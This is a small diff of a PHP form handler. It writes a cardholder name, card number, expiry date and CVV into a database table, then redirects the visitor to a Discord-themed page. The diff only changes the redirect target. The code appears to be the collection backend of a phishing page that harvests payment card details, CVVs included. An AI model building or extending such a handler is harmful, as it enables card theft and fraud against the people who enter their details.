@@ -9,7 +9,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $stmt = $connect->prepare("INSERT INTO cards (numeCard, numarCard, expirareCard, cvvCard) VALUES (?, ?, ?, ?)");
     $stmt->bind_param("sssi", $numePosesor, $cardnumber, $expirareCard, $cvv);
     $stmt->execute();
-    header('Location: http://discord.com');
+    header('Location: other/redirectionareDiscord.php');
 }
 
 ?>
